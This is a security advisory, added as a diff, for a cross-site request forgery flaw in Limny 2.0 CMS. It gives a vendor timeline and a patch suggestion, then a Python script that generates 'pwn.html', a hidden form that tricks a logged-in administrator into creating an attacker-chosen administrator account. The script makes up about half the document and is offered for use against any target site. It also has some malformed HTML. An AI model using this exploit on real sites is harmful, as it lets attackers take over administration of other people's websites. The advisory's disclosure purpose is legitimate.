@@ -1,0 +1,101 @@
+/¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\
+:Limny 2.0 CSRF               :  
+\____________________________/
+/Discovered By:              \ 
+|Luis Santana                 |
+\____________________________/
+
+Overview
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+The Limny 2.0 CMS is vulnerable to a Cross-Site-Request Forgery exploit which allows for a malicious attacker to create their own administrator user.
+
+Product Information
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+Product/Script: Limny CMS
+Affected Version: 2.0
+
+Vulnerability Type: CSRF
+Security Risk: High
+
+Vendor URL: http://www.limny.org/
+Product/Script Demo: http://demo.opensourcecms.com/limny
+
+Vendor Status: Informed
+Patch/Fix Status:
+Advisory Timeline: 02/15/10 : Vulnerability found, PoC created and vendor contacted
+		              Update: Vendor has started working on patch.
+                              Update: Vendor has created a Patch.
+
+Advisory URL:
+
+Product Description
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+Limny is a powerful, module-based and lightweight CMS. It is programmed in PHP and uses MySQL database. 
+
+Vulnerability Details
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+By crafting a simple hidden form webpage with a simple javascript form auto-submitter hidden inside of an iframe an attacker is able to add their own administrator privilleged user.
+
+Proof of Concept
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+See included .zip file for unweaponized (you need to click the "Save" button for the exploit to launch) PoC
+
+Patch/Fix Suggestion(s)
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+Implementing form cookies and checking for HTTP Referer would provide an adequate means of patching this vulnerability.
+
+Security Risk
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+This vulnerability is estimated to have a HIGH security risk.
+
+Author:
+~_¯~_¯~_¯~_¯~~_¯~_¯~_¯~_¯~_¯~_¯~
+The Author and Researcher of this Advisory is Luis Santana of the HackTalk Security Team
+
+'''
+Limny 2.0 CSRF Exploit
+Discovered By: Luis Santana
+Script By: Luis Santana
+HackTalk.net
+
+Shoutz to the Evilzone.org community, Shardy, Rage, Xires and Stacy
+'''
+
+__version__= 1.0
+
+p = open("pwn.html", "w")
+p.write('''<html>
+<head>
+<title>Limny2.0 CSRF by Luis Santana
+</head>
+<body>
+<h1>Press Save and Pwn Away</h1>
+''')
+base = str(input("What is the target website? "))
+p.write('<form name="adduser" action="')
+p.write(base)
+p.write('''/limny/?q=admin/modules/user/new" method="post" enctype="multipart/form-data">
+''')
+p.write("<table>")
+username = str(input("What username do you want? "))
+email = str(input("What email (can be fake) do you want? "))
+password = str(input("What password do you want? "))
+p.write('''<input name="user" type="hidden"  value="''')
+p.write(username)
+p.write('" /></td>')
+p.write('<td><input name="email" type="hidden" value="')
+p.write(email)
+p.write('"></td>')
+p.write('<td><input name="pass" type="hidden"  value="')
+p.write(password)
+p.write('"></td>')
+p.write('<td><input name="confirmpass" type="hidden" value="')
+p.write(password)
+p.write('"></td>')
+p.write('''<td><select name="language"><option value="english" selected="selected">English</option></select></td>
+<td><select name="usergroup"><option value="1">Administrator</option><option value="2">Moderator</option><option value="3" selected="selected">Administrator</option></select></td></tr>
+<td><input name=""picture" type="file" value="" /></td></tr><tr><td colspan="2"><button name="submit" type="submit">Save</button></td></tr></table></form>
+</body>
+</html>''')
+p.close()
+print("pwn.html has been created successfully! Upload this file to your webserver and then go pwn")
